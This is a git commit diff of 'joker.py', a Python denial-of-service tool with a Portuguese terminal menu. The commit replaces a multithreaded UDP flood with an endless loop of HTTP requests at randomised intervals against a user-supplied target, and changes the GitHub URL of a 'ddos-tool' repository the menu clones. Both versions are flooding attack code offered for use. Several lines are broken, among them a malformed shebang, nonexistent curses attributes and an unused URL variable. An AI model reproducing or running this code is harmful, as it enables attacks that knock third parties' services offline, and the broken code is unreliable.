9f6dec2bf9784f5214fe30b8ccd86250f7accd20
Nox <157261017+Soulsfuck@users.noreply.github.com>
2024-05-14 21:35:20 -0300

    Update joker.py

--- joker.py
+++ joker.py
@@ -1,12 +1,13 @@
 #!usr/bin/python3
 
-import socket
+import requests
 import threading
 import argparse
 import os
 import subprocess
 import curses
-
+import random
+import time
 
 TARGET = ""
 
@@ -38,13 +39,22 @@ LOGO = """
 ██████████▄▄▄▄▄▄▄██████████
 ███████████████████████████
    
+
+
+
+
+
+
 """
 
-
-def attack(target, port, message):
+def attack(target, message):
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(message.encode(), (target, port))
+        try:
+            response = requests.get(target)
+            print("Request sent to:", target)
+        except Exception as e:
+            print("Failed to send request:", e)
+        time.sleep(random.uniform(0.5, 2.0))  # Intervalo aleatório entre 0.5 e 2 segundos
 
 
 def main(stdscr):
@@ -60,9 +70,7 @@ def main(stdscr):
         ("Sair", "q")
     ]
 
-
     current_option = 0
-
 
     while True:
         key = stdscr.getkey()
@@ -73,34 +81,26 @@ def main(stdscr):
             current_option += 1
         elif key == "ENTER":
             if options[current_option][1] == "a":
-
                 stdscr.clear()
                 stdscr.addstr(0, (stdscr.cols // 2) - 15, "Informe o alvo:")
                 stdscr.addstr(1, (stdscr.cols // 2) - 15, "IP/DOMÍNIO:")
-                stdscr.addstr(2, (stdscr.cols // 2) - 15, "PORTA (padrão: 80):")
-                stdscr.addstr(3, (stdscr.cols // 2) - 15, "THREADS (padrão: 1000):")
                 stdscr.refresh()
                 target_ip = stdscr.getstr(0, (stdscr.cols // 2) + 15, 15)
-                target_port = int(stdscr.getstr(2, (stdscr.cols // 2) + 15, 5)) if stdscr.getstr(2, (stdscr.cols // 2) + 15, 5).isdigit() else 80
-                target_threads = int(stdscr.getstr(3, (stdscr.cols // 2) + 15, 5)) if stdscr.getstr(3, (stdscr.cols // 2) + 15, 5).isdigit() else 1000
                 TARGET = target_ip.decode()
-                message = "HEAD / HTTP/1.1\r\nHost: {}\r\n\r\n".format(TARGET)
-                for _ in range(target_threads):
-                    threading.Thread(target=attack, args=(TARGET, target_port, message)).start()
-                stdscr.addstr(5, (stdscr.cols // 2) - 15, "Ataque iniciado! Pressione qualquer tecla para sair...")
+                message = "http://{}".format(TARGET)
+                threading.Thread(target=attack, args=(TARGET, message)).start()
+                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Ataque iniciado! Pressione qualquer tecla para sair...")
                 stdscr.getkey()
                 stdscr.clear()
             elif options[current_option][1] == "c":
-
                 stdscr.clear()
                 stdscr.addstr(0, (stdscr.cols // 2) - 20, "Clonando repositório...")
                 stdscr.refresh()
-                subprocess.run(["git", "clone", "--force", "https://github.com/BlackhatGPT/ddos-tool.git"])
+                subprocess.run(["git", "clone", "--force", "https://github.com/JOJOofSouls/ddos-tool.git"])
                 stdscr.addstr(2, (stdscr.cols // 2) - 15, "Repositório clonado com sucesso! Pressione qualquer tecla para continuar...")
                 stdscr.getkey()
                 stdscr.clear()
             elif options[current_option][1] == "i":
-
                 stdscr.clear()
                 stdscr.addstr(0, (stdscr.cols // 2) - 15, "Instalando dependências...")
                 stdscr.refresh()
@@ -109,13 +109,9 @@ def main(stdscr):
                 stdscr.getkey()
                 stdscr.clear()
             elif options[current_option][1] == "q":
-
                 break
 
-
         stdscr.addstr(stdscr.lines // 2, (stdscr.cols // 2) - len(options[current_option][0]) // 2, options[current_option][0])
-
-
         stdscr.refresh()
 
 curses.wrapper(main)
